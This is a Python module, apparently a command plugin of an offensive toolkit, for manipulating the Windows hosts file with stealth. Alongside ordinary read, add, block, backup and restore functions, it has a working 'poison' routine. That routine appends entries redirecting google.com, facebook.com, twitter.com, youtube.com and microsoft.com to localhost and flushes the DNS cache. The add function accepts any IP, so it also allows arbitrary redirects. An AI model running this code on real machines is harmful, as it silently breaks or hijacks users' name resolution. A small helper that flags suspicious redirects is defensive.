#!/usr/bin/env python3
"""
Elite Hosts File Command - Advanced hosts file manipulation
Comprehensive hosts file management with stealth techniques
"""

import ctypes
from ctypes import wintypes
import os
import shutil
import datetime

class EliteHostsFile:
    """Elite hosts file manipulation"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.hosts_path = r"C:\\Windows\\System32\\drivers\\etc\\hosts"
        self.backup_path = r"C:\\Windows\\System32\\drivers\\etc\\hosts.backup"
        
    def execute(self, action, domain=None, ip_address=None):
        """Manipulate hosts file with various actions"""
        try:
            if action == 'read':
                return self._read_hosts_file()
            elif action == 'add':
                return self._add_hosts_entry(domain, ip_address)
            elif action == 'remove':
                return self._remove_hosts_entry(domain)
            elif action == 'block':
                return self._block_domain(domain)
            elif action == 'unblock':
                return self._unblock_domain(domain)
            elif action == 'backup':
                return self._backup_hosts_file()
            elif action == 'restore':
                return self._restore_hosts_file()
            elif action == 'clear':
                return self._clear_hosts_file()
            elif action == 'poison':
                return self._poison_hosts_file()
            else:
                return {
                    'success': False,
                    'error': f'Unknown action: {action}',
                    'available_actions': ['read', 'add', 'remove', 'block', 'unblock', 'backup', 'restore', 'clear', 'poison']
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Hosts file operation failed: {str(e)}'
            }
    
    def _read_hosts_file(self):
        """Read and parse hosts file"""
        try:
            if not os.path.exists(self.hosts_path):
                return {
                    'success': False,
                    'error': 'Hosts file not found'
                }
            
            entries = []
            comments = []
            
            with open(self.hosts_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            for line_num, line in enumerate(lines, 1):
                original_line = line.rstrip()
                line = line.strip()
                
                if not line:
                    continue
                elif line.startswith('#'):
                    comments.append({
                        'line_number': line_num,
                        'comment': original_line
                    })
                else:
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[0]
                        domains = parts[1:]
                        
                        for domain in domains:
                            entries.append({
                                'line_number': line_num,
                                'ip_address': ip,
                                'domain': domain,
                                'original_line': original_line
                            })
            
            # Get file metadata
            stat = os.stat(self.hosts_path)
            file_info = {
                'size': stat.st_size,
                'modified': datetime.datetime.fromtimestamp(stat.st_mtime).isoformat(),
                'permissions': oct(stat.st_mode)[-3:]
            }
            
            return {
                'success': True,
                'file_info': file_info,
                'total_entries': len(entries),
                'total_comments': len(comments),
                'entries': entries,
                'comments': comments,
                'analysis': self._analyze_hosts_entries(entries)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to read hosts file: {str(e)}'
            }
    
    def _add_hosts_entry(self, domain, ip_address):
        """Add entry to hosts file"""
        try:
            if not domain or not ip_address:
                return {
                    'success': False,
                    'error': 'Both domain and IP address are required'
                }
            
            # Validate IP address format
            if not self._validate_ip_address(ip_address):
                return {
                    'success': False,
                    'error': f'Invalid IP address format: {ip_address}'
                }
            
            # Check if entry already exists
            current_hosts = self._read_hosts_file()
            if current_hosts.get('success'):
                for entry in current_hosts.get('entries', []):
                    if entry['domain'].lower() == domain.lower():
                        return {
                            'success': False,
                            'error': f'Domain {domain} already exists in hosts file',
                            'existing_entry': entry
                        }
            
            # Create backup before modification
            backup_result = self._backup_hosts_file()
            
            # Add the entry
            new_entry = f"{ip_address}\\t{domain}\\n"
            
            with open(self.hosts_path, 'a', encoding='utf-8') as f:
                f.write(new_entry)
            
            # Flush DNS cache
            self._flush_dns_cache()
            
            return {
                'success': True,
                'message': f'Added entry: {ip_address} -> {domain}',
                'entry': {
                    'ip_address': ip_address,
                    'domain': domain
                },
                'backup_created': backup_result.get('success', False)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to add hosts entry: {str(e)}'
            }
    
    def _remove_hosts_entry(self, domain):
        """Remove entry from hosts file"""
        try:
            if not domain:
                return {
                    'success': False,
                    'error': 'Domain is required'
                }
            
            # Read current hosts file
            if not os.path.exists(self.hosts_path):
                return {
                    'success': False,
                    'error': 'Hosts file not found'
                }
            
            # Create backup
            backup_result = self._backup_hosts_file()
            
            # Read and filter lines
            with open(self.hosts_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            removed_entries = []
            new_lines = []
            
            for line in lines:
                original_line = line.rstrip()
                stripped_line = line.strip()
                
                if stripped_line and not stripped_line.startswith('#'):
                    parts = stripped_line.split()
                    if len(parts) >= 2:
                        domains = parts[1:]
                        if domain.lower() in [d.lower() for d in domains]:
                            removed_entries.append({
                                'ip_address': parts[0],
                                'domain': domain,
                                'original_line': original_line
                            })
                            continue
                
                new_lines.append(line)
            
            if not removed_entries:
                return {
                    'success': False,
                    'error': f'Domain {domain} not found in hosts file'
                }
            
            # Write back the filtered content
            with open(self.hosts_path, 'w', encoding='utf-8') as f:
                f.writelines(new_lines)
            
            # Flush DNS cache
            self._flush_dns_cache()
            
            return {
                'success': True,
                'message': f'Removed {len(removed_entries)} entries for domain {domain}',
                'removed_entries': removed_entries,
                'backup_created': backup_result.get('success', False)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to remove hosts entry: {str(e)}'
            }
    
    def _block_domain(self, domain):
        """Block domain by redirecting to localhost"""
        try:
            return self._add_hosts_entry(domain, '127.0.0.1')
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to block domain: {str(e)}'
            }
    
    def _unblock_domain(self, domain):
        """Unblock domain by removing from hosts file"""
        try:
            return self._remove_hosts_entry(domain)
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to unblock domain: {str(e)}'
            }
    
    def _backup_hosts_file(self):
        """Create backup of hosts file"""
        try:
            if os.path.exists(self.hosts_path):
                timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
                backup_path = f"{self.backup_path}.{timestamp}"
                
                shutil.copy2(self.hosts_path, backup_path)
                
                return {
                    'success': True,
                    'message': f'Hosts file backed up to {backup_path}',
                    'backup_path': backup_path
                }
            else:
                return {
                    'success': False,
                    'error': 'Hosts file not found'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to backup hosts file: {str(e)}'
            }
    
    def _restore_hosts_file(self):
        """Restore hosts file from backup"""
        try:
            # Find the most recent backup
            backup_dir = os.path.dirname(self.backup_path)
            backup_files = []
            
            if os.path.exists(backup_dir):
                for file in os.listdir(backup_dir):
                    if file.startswith('hosts.backup'):
                        backup_files.append(os.path.join(backup_dir, file))
            
            if not backup_files:
                return {
                    'success': False,
                    'error': 'No backup files found'
                }
            
            # Use the most recent backup
            latest_backup = max(backup_files, key=os.path.getmtime)
            
            shutil.copy2(latest_backup, self.hosts_path)
            
            # Flush DNS cache
            self._flush_dns_cache()
            
            return {
                'success': True,
                'message': f'Hosts file restored from {latest_backup}',
                'restored_from': latest_backup
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to restore hosts file: {str(e)}'
            }
    
    def _clear_hosts_file(self):
        """Clear hosts file (keep only default entries)"""
        try:
            # Create backup first
            backup_result = self._backup_hosts_file()
            
            # Default Windows hosts file content
            default_content = """# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
"""
            
            with open(self.hosts_path, 'w', encoding='utf-8') as f:
                f.write(default_content)
            
            # Flush DNS cache
            self._flush_dns_cache()
            
            return {
                'success': True,
                'message': 'Hosts file cleared and reset to default',
                'backup_created': backup_result.get('success', False)
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to clear hosts file: {str(e)}'
            }
    
    def _poison_hosts_file(self):
        """Add malicious entries for DNS poisoning (educational purposes)"""
        try:
            # Create backup first
            backup_result = self._backup_hosts_file()
            
            # Common targets for demonstration (redirect to localhost)
            poison_entries = [
                ('127.0.0.1', 'google.com'),
                ('127.0.0.1', 'www.google.com'),
                ('127.0.0.1', 'facebook.com'),
                ('127.0.0.1', 'www.facebook.com'),
                ('127.0.0.1', 'twitter.com'),
                ('127.0.0.1', 'www.twitter.com'),
                ('127.0.0.1', 'youtube.com'),
                ('127.0.0.1', 'www.youtube.com'),
                ('127.0.0.1', 'microsoft.com'),
                ('127.0.0.1', 'www.microsoft.com')
            ]
            
            added_entries = []
            
            # Add poison entries
            with open(self.hosts_path, 'a', encoding='utf-8') as f:
                f.write('\\n# DNS Poison Entries (Educational)\\n')
                for ip, domain in poison_entries:
                    f.write(f'{ip}\\t{domain}\\n')
                    added_entries.append({'ip': ip, 'domain': domain})
            
            # Flush DNS cache
            self._flush_dns_cache()
            
            return {
                'success': True,
                'message': f'Added {len(added_entries)} poison entries',
                'added_entries': added_entries,
                'backup_created': backup_result.get('success', False),
                'warning': 'This is for educational purposes only!'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to poison hosts file: {str(e)}'
            }
    
    def _analyze_hosts_entries(self, entries):
        """Analyze hosts file entries for suspicious patterns"""
        try:
            analysis = {
                'total_entries': len(entries),
                'unique_ips': len(set(entry['ip_address'] for entry in entries)),
                'localhost_redirects': 0,
                'suspicious_entries': [],
                'blocked_domains': [],
                'ip_distribution': {}
            }
            
            for entry in entries:
                ip = entry['ip_address']
                domain = entry['domain']
                
                # Count IP distribution
                analysis['ip_distribution'][ip] = analysis['ip_distribution'].get(ip, 0) + 1
                
                # Check for localhost redirects (blocking)
                if ip in ['127.0.0.1', '0.0.0.0', '::1']:
                    analysis['localhost_redirects'] += 1
                    analysis['blocked_domains'].append(domain)
                
                # Check for suspicious patterns
                if any(keyword in domain.lower() for keyword in ['bank', 'paypal', 'amazon', 'microsoft', 'google']):
                    analysis['suspicious_entries'].append({
                        'domain': domain,
                        'ip': ip,
                        'reason': 'Popular service redirect'
                    })
                
                # Check for non-standard IPs
                if not ip.startswith(('127.', '192.168.', '10.', '172.')) and ip != '0.0.0.0':
                    analysis['suspicious_entries'].append({
                        'domain': domain,
                        'ip': ip,
                        'reason': 'External IP redirect'
                    })
            
            return analysis
            
        except Exception as e:
            return {'error': str(e)}
    
    def _validate_ip_address(self, ip):
        """Validate IP address format"""
        try:
            parts = ip.split('.')
            if len(parts) != 4:
                return False
            
            for part in parts:
                if not part.isdigit() or not 0 <= int(part) <= 255:
                    return False
            
            return True
            
        except:
            return False
    
    def _flush_dns_cache(self):
        """Flush DNS cache to apply changes"""
        try:
            import subprocess
            subprocess.run(['ipconfig', '/flushdns'], capture_output=True, timeout=10)
        except:
            pass

def elite_hostsfile(action, domain=None, ip_address=None):
    """Elite hostsfile command entry point"""
    hosts_cmd = EliteHostsFile()
    return hosts_cmd.execute(action, domain, ip_address)